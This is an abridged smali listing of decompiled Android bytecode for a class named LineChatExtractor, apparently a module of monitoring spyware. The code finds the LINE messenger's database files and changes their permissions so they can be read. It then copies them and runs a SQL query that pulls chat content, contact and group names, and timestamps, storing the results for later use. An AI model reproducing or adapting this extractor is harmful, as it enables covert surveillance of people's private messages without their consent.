.class public Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;
...
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    ...
    .line 28
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 35
    iput-object p1, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    .line 36
    iput-object p2, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;

    .line 37
    iput-object p3, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 38
    iput-object p4, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;
...
.method protected chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    ...
    .line 259
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->context:Lcom/hp/vd/context/Context;
...
.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    ...
    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->context:Lcom/hp/vd/context/Context;
    ...
    .line 343
    new-instance v1, Lcom/hp/vd/module/monitor/line/From91710133/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/monitor/line/From91710133/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V
    ...
    .line 350
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;
...
.method protected detectDatabaseFiles()Ljava/lang/String;
    ...
    .line 218
    invoke-virtual {p0, v5}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->isReadable(Ljava/lang/String;)Z
    ...
    invoke-virtual {p0, v5, v6}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
...
.method protected extractChats(Landroid/database/sqlite/SQLiteDatabase;)V
    ...
    .line 118
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "ln_max_id"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v1, v2}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->safeExtractInt(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;I)Ljava/lang/Integer;

    move-result-object v0

    .line 124
    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_length"

    const/16 v4, 0x200

    invoke-virtual {p0, v1, v3, v4}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->safeExtractInt(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;I)Ljava/lang/Integer;

    move-result-object v1

    .line 130
    new-instance v3, Lcom/hp/vd/module/monitor/line/From91710133/Columns;

    invoke-direct {v3}, Lcom/hp/vd/module/monitor/line/From91710133/Columns;-><init>()V

    :try_start_0
    const-string v4, "SELECT ch.id, ch.type, case when ch.from_mid is null then 3 when ch.from_mid is not null then 1 end as status, c.name, g.name as group_name, ch.content, ch.created_time FROM chat_history ch LEFT JOIN contacts c ON c.m_id = ch.from_mid OR c.m_id = ch.chat_id LEFT JOIN groups g ON g.id = ch.chat_id WHERE ch.id > ? AND LENGTH(ch.content) < ? ORDER BY ch.id ASC LIMIT ?"
    ...
    .line 146
    iget-object p1, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;
    ...
    .line 173
    iget-object v2, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->lineChatDao:Lcom/j256/ormlite/dao/Dao;
    ...
    .line 186
    iget-object p1, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;
    ...
    .line 191
    iget-object p1, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->context:Lcom/hp/vd/context/Context;
...
.method protected prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;
    ...
    .line 299
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    ...
    .line 316
    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;
    ...
    .line 301
    iget-object p2, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;
...
.method public run()V
    ...
    .line 47
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    .line 52
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->detectDatabaseFiles()Ljava/lang/String;
    ...
    .line 70
    iget-object v3, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->context:Lcom/hp/vd/context/Context;
    ...
    .line 76
    invoke-virtual {p0, v1, v0}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    ...
    .line 106
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->extractChats(Landroid/database/sqlite/SQLiteDatabase;)V
    ...
    .line 92
    iget-object v2, p0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;
